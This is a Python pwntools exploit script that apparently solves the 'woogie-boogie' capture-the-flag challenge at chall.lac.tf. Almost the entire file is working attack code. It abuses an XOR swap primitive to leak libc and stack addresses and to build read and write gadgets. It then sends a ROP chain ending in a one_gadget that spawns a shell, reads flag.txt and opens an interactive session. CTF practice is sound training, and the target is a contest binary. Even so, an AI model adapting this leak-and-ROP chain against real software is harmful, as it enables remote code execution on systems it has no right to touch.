```python
#!/usr/bin/env python
from pwn import *

GDB_OFF = 0x555555554000
IP = 'chall.lac.tf'
PORT = 31166
BINARY = './woogie-boogie'
ARGS = []
ENV = {}

GDB = f"""
set follow-fork-mode parent

# atol done
# b * readint+0x3d

# call swap
# b * main+0xbb 

# b swap

# *b = *a ^ *b
b * swap+0x3d

# swap ret 
# b * swap+0x5a

# main ret
# b * main+0x18a

c"""

context.arch = 'amd64'

if not args.REMOTE:
  context.binary = exe = ELF(BINARY, checksec=False)
  libc = ELF('./libc.so.6', checksec=False)

context.aslr = False

byt = lambda x: x if isinstance(x, bytes) else x.encode() if isinstance(x, str) else repr(x).encode()
phex = lambda x, y='': print(y + hex(x))
lhex = lambda x, y='': log.info(y + hex(x))
pad = lambda x, s=8, v=b'\0', o='r': byt(x).ljust(s, v) if o == 'r' else byt(x).rjust(s, v)
padhex = lambda x, s: pad(hex(x)[2:], s, '0', 'l')
upad = lambda x: u64(pad(x))

t = None
gt = lambda at=None: at if at else t
sl = lambda x, t=None: gt(t).sendline(byt(x))
se = lambda x, t=None: gt(t).send(byt(x))
sla = lambda x, y, t=None: gt(t).sendlineafter(byt(x), byt(y))
sa = lambda x, y, t=None: gt(t).sendafter(byt(x), byt(y))
ra = lambda t=None: gt(t).recvall()
rl = lambda t=None: gt(t).recvline()
re = lambda x, t=None: gt(t).recv(x)
ru = lambda x, t=None: gt(t).recvuntil(byt(x))
it = lambda t=None: gt(t).interactive()
cl = lambda t=None: gt(t).close()

linfo = lambda x: log.info(x)

vm = None
def get_target(**kw):
    global vm

    if args.REMOTE:
        # context.log_level = 'debug'
        return remote(IP, PORT)

    from vagd import Dogd, Qegd, Vagd, Shgd, Box # only load vagd if needed
    if not vm:
        vm = Dogd(exe.path, image=Box.DOCKER_FOCAL, ex=True, fast=True)  # Docker
    if vm.is_new:
        linfo("new vagd instance") # additional setup here
    return vm.start(argv=ARGS, env=ENV, gdbscript=GDB, **kw)

BASE = 0

def base_diff(a, base=None):
  if base is None:
    base = BASE
  diff = a - base
  assert diff % 8 == 0, "unaligned diff"
  return diff // 8

def woogie_boogie(a, b):
  sla("woogie: ", a)
  sla("boogie: ", b)

def leaker():
  woogie_boogie(0, 0)
  return u64(rl()[:-1], endian='big')

t = get_target()

# leak libc
BASE = 0x7fffffffed10
START_REF = base_diff(0x7fffffffede8)
ROP = base_diff(0x7fffffffed38)

woogie_boogie(0, START_REF)
woogie_boogie(0, ROP)
leak = leaker()
LIBC = leak - 0x24083
if not args.REMOTE:
  libc.address = LIBC
lhex(LIBC, "libc: ")

# leak stack
STACK_LEAK = base_diff(0x7fffffffec68, 0x7fffffffec30)

woogie_boogie(START_REF, ROP)
woogie_boogie(0, STACK_LEAK)
leak = leaker()
STACK = leak
lhex(STACK, "stack: ") # 0x7fffffffed48

# allocate (c 8)
PAD = 0xe0
BASE = STACK - 0x1f8

linfo("allocate")
ALLOCS = 7
for i in range(ALLOCS):
  print(f'{i}/{ALLOCS}', end='\r')
  woogie_boogie(START_REF, ROP)
  woogie_boogie(0, 0)
  BASE -= PAD

# important offsets
BASE = 0x7fffffffe530

SWAP_ROP = base_diff(0x7fffffffe518)
A_STACK = base_diff(0x7fffffffe508) 
B_STACK = base_diff(0x7fffffffe500)
WOOGIE_STACK = base_diff(0x7fffffffe538)
BOOGIE_STACK = base_diff(0x7fffffffe540)

def create_char(char):
  assert char < 0x100, "char to large"
  woogie_boogie(char, WOOGIE_STACK)
  woogie_boogie(0, char)

# RCE (c 11)
linfo("woogie boogie")
lhex(BASE, 'base: ')

DONOR = base_diff(0x7fffffffe318, 0x7fffffffe370)
READ_GADGET = 0x1248
DONOR_ADR = 0x1280

char = READ_GADGET & 0xff
ptr = BASE^char

up = base_diff(ptr)
lhex(ptr, "up: ")
woogie_boogie(up, DONOR) 
create_char(char)
woogie_boogie(B_STACK, 0)

linfo("create WRITE gadget")
# c 15
# can be shortend but easier to explain like this
xor = char ^ (DONOR_ADR & 0xff) ^ (READ_GADGET & 0xff)
xor_ptr = BASE^xor 
xor_up = base_diff(xor_ptr)
woogie_boogie(xor_up, up) 
create_char(xor)
woogie_boogie(B_STACK, 0)

# c 19
linfo("start ROP")
woogie_boogie(SWAP_ROP, xor_up)

rce = flat(
  LIBC + 0xce383, # clear rdx
  LIBC + 0xe3b01 # one_gadget
)

linfo("spawn shell")
sl(rce)

if args.REMOTE:
  sleep(1)

linfo("get flag")
sl("echo PWN")
sla("PWN", "cat flag.txt")

it() # or t.interactive()
```

